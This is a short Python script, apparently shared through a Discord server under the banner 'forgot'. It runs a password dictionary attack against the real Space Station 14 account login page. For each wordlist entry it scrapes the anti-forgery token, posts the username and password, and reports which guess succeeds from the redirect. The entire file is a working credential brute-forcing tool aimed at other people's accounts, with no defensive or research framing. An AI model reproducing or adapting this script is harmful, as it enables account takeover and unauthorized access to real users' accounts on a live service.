import requests
from bs4 import BeautifulSoup
import shutil

art = r"""
  __                       _   
 / _| ___  _ __ __ _  ___ | |_ 
| |_ / _ \| '__/ _` |/ _ \| __|
|  _| (_) | | | (_| | (_) | |_ 
|_|  \___/|_|  \__, |\___/ \__|
               |___/           

https://discord.gg/5z9hdquRfF

"""

width = shutil.get_terminal_size().columns
for line in art.splitlines():
    print(line.center(width))
    
def main():
    ckey = input("CKEY: ")
    path = input("FULL PATH TO DICT: ")
    
    session = requests.Session()
    
    try:
        with open(path) as f:
            for password in f:
                password = password.strip()

                login_page = session.get("https://account.spacestation14.com/Identity/Account/Login")
                soup = BeautifulSoup(login_page.text, 'html.parser')
                token = soup.find('input', {'name': '__RequestVerificationToken'})['value']

                login_data = {
                    "Input.EmailOrUsername": ckey, 
                    "Input.Password": password, 
                    "Input.RememberMe": "false",
                    "__RequestVerificationToken": token
                }

                response = session.post(
                    "https://account.spacestation14.com/Identity/Account/Login",
                    data=login_data,
                    allow_redirects=False
                )
                
                if response.status_code == 302 and "Location" in response.headers:
                    if response.headers["Location"].endswith("/"):
                        print(f"✅ SUCCESS!!!! PASSWORD: {password}")
                        return
                
                print(f"❌ FAILED!!!! PASSWORD: {password}")
    
    except FileNotFoundError:
        print("DICT NOT FOUND")
    except Exception as e:
        print(f"ERROR: {str(e)}")

if __name__ == '__main__': 
    main()